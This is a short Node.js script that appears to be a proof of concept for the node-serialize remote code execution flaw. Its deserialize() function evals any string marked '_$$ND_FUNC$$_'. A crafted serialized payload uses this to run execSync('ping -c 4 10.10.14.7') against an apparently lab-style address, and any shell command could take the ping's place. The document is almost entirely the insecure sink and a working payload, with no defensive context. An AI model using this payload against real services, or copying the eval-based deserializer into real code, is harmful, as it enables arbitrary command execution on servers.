var exec = require('child_process').exec;
function deserialize(serializedData) {
  var deserializedObj = JSON.parse(serializedData);
  var obj = {};

  for (var key in deserializedObj) {
    if (deserializedObj.hasOwnProperty(key)) {
      var value = deserializedObj[key];
      if (typeof value === 'string' && value.startsWith("_$$ND_FUNC$$_")) {
        var functionString = value.substring("_$$ND_FUNC$$_".length);
        obj[key] = eval('(' + functionString + ')');
      } else {
        obj[key] = value;
      }
    }
  }

  return obj;
}

var serializedData =  '{"test":"_$$ND_FUNC$$_function(){ require(\'child_process\').execSync(\"ping -c 4 10.10.14.7\", function puts(error, stdout, stderr) {}); }()"}';
var deserializedData = deserialize(serializedData);

console.log(deserializedData);

